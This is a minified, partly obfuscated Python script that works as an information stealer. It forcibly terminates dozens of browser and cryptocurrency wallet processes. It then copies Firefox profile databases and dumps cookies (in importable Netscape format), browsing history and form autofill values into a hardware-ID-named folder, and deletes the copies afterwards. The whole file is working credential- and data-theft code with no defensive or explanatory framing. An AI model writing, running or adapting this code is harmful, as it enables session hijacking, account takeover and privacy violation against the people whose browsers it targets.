_N='expiry'
_M='isSecure'
_L='uniswap.exe'
_K='trustwallet.exe'
_J='coinomi.exe'
_I='armory.exe'
_H='avant.exe'
_G='k-meleon.exe'
_F='gnome-web.exe'
_E='lunascape.exe'
_D='falkon.exe'
_C='qutebrowser.exe'
_B='brave.exe'
_A='name'
import os,sqlite3,shutil,asyncio,json,uuid,traceback,time,psutil,time
browser_processes=['chrome.exe','msedge.exe','opera.exe',_B,'vivaldi.exe','yandex.exe','slimjet.exe','epic.exe','dragon.exe','centbrowser.exe',_C,_D,'whale.exe','iron.exe','torch.exe','coccoc.exe','polarity.exe','javelin.exe','orbit.exe','chedot.exe',_E,'otter.exe','palemoon.exe','tutanota.exe','duckduckgo.exe','safeguard.exe','xbrowser.exe','medeanalytics.exe','tinfoil.exe','webcat.exe','basilisk.exe','tor.exe','flynx.exe','librewolf.exe','seamonkey.exe','midori.exe',_F,'surf.exe',_C,'qute-browser.exe','otter-browser.exe','pale-moon.exe','arora.exe','qupzilla.exe','kometa.exe',_G,_H,_E,'puffin.exe','sleipnir.exe','epiphany.exe','firefox.exe',_D,'librefox.exe',_F,'webpositive.exe','nexx.exe',_G,_H,'ibrowsr.exe','superbird.exe','rockmelt.exe','hotdog.exe','freedom.exe','flashpeak.exe','slimbrowser.exe','nanoweb.exe','datafox.exe','cyberfox.exe','eset.exe','reborn.exe','charm.exe','fossa.exe','penguin.exe','novel.exe','celtic.exe','polyweb.exe']
wallet_processes=['bitcoin-qt.exe','zcashd.exe',_I,'bytecoin.exe','jaxx.exe','exodus.exe','geth.exe','electrum.exe','atomic.exe','guarda.exe',_J,_K,'dapper.exe','zerion.exe','argent.exe','curve.exe','sushiswap.exe',_L,'1inch.exe','blockchain.exe','mycelium.exe','paxful.exe','celo.exe','nexo.exe',_B,'metamask.exe','bancor.exe','pillar.exe',_K,'kinesis.exe','ripple.exe','ledger-live.exe','trezor.exe',_I,'libra.exe',_L,'coinbase.exe','crypto.exe','zengo.exe','bitpay.exe','bitbns.exe',_J,'blockchain.info.exe','smartbit.exe','bitcoin-cash.exe','stellar.exe','dash.exe','monero.exe','vechain.exe','terra.exe','algorand.exe','tezos.exe','hedera.exe','filecoin.exe','safepal.exe','horizon.exe','bittrex.exe','bitstamp.exe','gate.io.exe','kucoin.exe','okex.exe','pancakeswap.exe']
def kill_processes(process_names,attempts=25,delay=0):
	B='pid'
	for C in range(attempts):
		print(f"Attempt {C+1} to kill processes...")
		for A in psutil.process_iter([B,_A]):
			try:
				if A.info[_A].lower()in[A.lower()for A in process_names]:print(f"Killing process: {A.info[_A]} (PID: {A.info[B]})");A.terminate()
			except(psutil.NoSuchProcess,psutil.AccessDenied,psutil.ZombieProcess):pass
		time.sleep(delay)
print('Killing browser processes...')
kill_processes(browser_processes)
print('Killing wallet processes...')
kill_processes(wallet_processes)
print('Done.')
time.sleep(1)
import os,shutil,sqlite3,traceback,uuid,asyncio
class BrowserDataExtractor:
	def __init__(A):
		A.hwid=uuid.getnode();print(f"HWID: {A.hwid}");A.search_folder=os.path.expandvars('C:\\Users\\%username%\\Documents');A.hwid_folder=os.path.join(A.search_folder,str(A.hwid))
		if not os.path.exists(A.hwid_folder):os.makedirs(A.hwid_folder);print(f"Created HWID folder at {A.hwid_folder}")
		else:print(f"HWID folder already exists at {A.hwid_folder}")
		A.RoamingAppData=os.path.expandvars('C:\\Users\\%username%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles');A.FirefoxFilesFullPath=[];A.FirefoxCookieList=[];A.FirefoxHistoryList=[];A.FirefoxAutofiList=[];A.FireFox=False;A.output_folder=os.path.join(A.hwid_folder,'firefox')
		if not os.path.exists(A.output_folder):os.makedirs(A.output_folder);print(f"Created 'firefox' folder at {A.output_folder}")
		else:print(f"'firefox' folder already exists at {A.output_folder}")
	def ListFirefoxProfiles(B):
		'List and copy Firefox profile databases.';print('Listing Firefox profiles...')
		try:
			C=B.RoamingAppData
			if os.path.isdir(C):
				for(F,I,G)in os.walk(C):
					for A in G:
						if A.endswith('cookies.sqlite')or A.endswith('places.sqlite')or A.endswith('formhistory.sqlite'):D=os.path.join(F,A);E=os.path.join(B.output_folder,os.path.basename(D));shutil.copyfile(D,E);B.FirefoxFilesFullPath.append(E);print(f"Copied {D} to {E}")
			else:print(f"Directory {C} does not exist")
		except Exception as H:print(f"Error listing Firefox profiles: {H}");traceback.print_exc()
	async def GetFirefoxCookies(C):
		'Extract and save Firefox cookies.';print('Extracting Firefox cookies...')
		try:
			F=[]
			for B in C.FirefoxFilesFullPath:
				if'cookies'in B:
					try:
						G=sqlite3.connect(B);D=G.cursor();D.execute('SELECT host, name, path, value, expiry FROM moz_cookies');H=D.fetchall()
						for A in H:F.append({'host':A[0],_M:A[4]!=0,'path':A[2],'isHttpOnly':A[0].startswith('.'),_N:A[4],_A:A[1],'value':A[3]})
						print(f"Extracted cookies from {B}")
					except sqlite3.Error as I:print(f"Database error while processing {B}: {I}");traceback.print_exc()
					except Exception as E:print(f"Error extracting cookies from {B}: {E}");traceback.print_exc()
					finally:D.close();G.close()
			C.save_cookies_in_netscape_format(C.output_folder,F)
		except Exception as E:print(f"Error extracting Firefox cookies: {E}");traceback.print_exc()
		else:C.FireFox=True
	async def GetFirefoxHistory(C):
		'Extract and save Firefox browsing history.';print('Extracting Firefox history...')
		try:
			F=os.path.join(C.output_folder,'history.txt')
			try:
				with open(F,'w',encoding='utf-8')as H:
					for A in C.FirefoxFilesFullPath:
						if'places'in A:
							try:
								G=sqlite3.connect(A);D=G.cursor();D.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places');I=D.fetchall()
								for B in I:H.write(f"""ID: {B[0]}
URL: {B[1]}
Title: {B[2]}
Visit Count: {B[3]}
Last Visit Time: {B[4]}
====================================================================================
""")
								print(f"Extracted history from {A}")
							except sqlite3.Error as J:print(f"Database error while processing {A}: {J}");traceback.print_exc()
							except Exception as E:print(f"Error extracting history from {A}: {E}");traceback.print_exc()
							finally:D.close();G.close()
				print(f"Saved history to {F}")
			except IOError as K:print(f"Error saving history to file: {K}");traceback.print_exc()
		except Exception as E:print(f"Error extracting Firefox history: {E}");traceback.print_exc()
		else:C.FireFox=True
	async def GetFirefoxAutoFills(D):
		'Extract and save Firefox autofill data.';K='last_use';print('Extracting Firefox autofills...')
		try:
			F=os.path.join(D.output_folder,'autofills.txt')
			try:
				with open(F,'w',encoding='utf-8')as L:
					for A in D.FirefoxFilesFullPath:
						if'formhistory'in A:
							try:
								G=sqlite3.connect(A);B=G.cursor();B.execute('PRAGMA table_info(moz_formhistory)');H=[A[1]for A in B.fetchall()]
								if K in H:I='SELECT id, fieldname, value, datetime(last_use) FROM moz_formhistory'
								else:I='SELECT id, fieldname, value FROM moz_formhistory'
								B.execute(I);M=B.fetchall()
								for C in M:
									J=f"ID: {C[0]}\nField Name: {C[1]}\nValue: {C[2]}"
									if K in H:J+=f"\nLast Use: {C[3]}"
									L.write(J+'\n====================================================================================\n')
								print(f"Extracted autofills from {A}")
							except sqlite3.Error as N:print(f"Database error while processing {A}: {N}");traceback.print_exc()
							except Exception as E:print(f"Error extracting autofills from {A}: {E}");traceback.print_exc()
							finally:B.close();G.close()
				print(f"Saved autofills to {F}")
			except IOError as O:print(f"Error saving autofills to file: {O}");traceback.print_exc()
		except Exception as E:print(f"Error extracting Firefox autofills: {E}");traceback.print_exc()
		else:D.FireFox=True
	def save_cookies_in_netscape_format(P,folder_path,cookies):
		'Save cookies in Netscape format.';E='FALSE';D='TRUE';B=os.path.join(folder_path,'cookies.txt')
		try:
			with open(B,'w',encoding='ISO-8859-1')as F:
				for A in cookies:C=A['host'];G=A['path'];H=A[_M];I=A[_N];J=A[_A];K=A['value'];L=D if H else E;M=D if C.startswith('.')else E;N=f"{C}\t{M}\t{G}\t{L}\t{I}\t{J}\t{K}";F.write(N+'\n')
			print(f"[*] Saved cookies in Netscape format at {B}")
		except IOError as O:print(f"Error saving cookies in Netscape format: {O}");traceback.print_exc()
	def remove_sqlite_files(B):
		'Remove all .sqlite files after extraction.';print('Removing .sqlite files...')
		try:
			for A in B.FirefoxFilesFullPath:
				if A.endswith('.sqlite'):os.remove(A);print(f"Removed {A}")
		except Exception as C:print(f"Error removing .sqlite files: {C}");traceback.print_exc()
async def main():A=BrowserDataExtractor();A.ListFirefoxProfiles();await A.GetFirefoxCookies();await A.GetFirefoxHistory();await A.GetFirefoxAutoFills();A.remove_sqlite_files()
asyncio.run(main())